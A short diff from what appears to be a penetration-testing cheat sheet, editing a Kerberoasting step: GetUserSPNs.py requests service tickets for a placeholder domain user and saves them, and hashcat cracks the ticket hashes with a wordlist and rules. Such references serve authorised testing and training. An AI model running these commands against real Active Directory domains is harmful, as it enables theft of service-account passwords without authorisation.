@@ -98,7 +98,7 @@ PowerView3 > Get-DomainUser -Identity snovvcrash -Properties samaccountname,serv
 ##### GetUserSPNs.py
 
 ```
-$ GetUserSPNs.py megacorp.local/snovvcrash:'Passw0rd!' -dc-ip 127.0.0.1 [-request|-save]
+$ GetUserSPNs.py megacorp.local/snovvcrash:'Passw0rd!' -dc-ip 127.0.0.1 -request -outfile tgsrep.in
 $ ./hashcat64.exe -m 13100 -a 0 -w 4 -O --session=snovvcrash -o tgsrep.out tgsrep.in seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
 ```
 
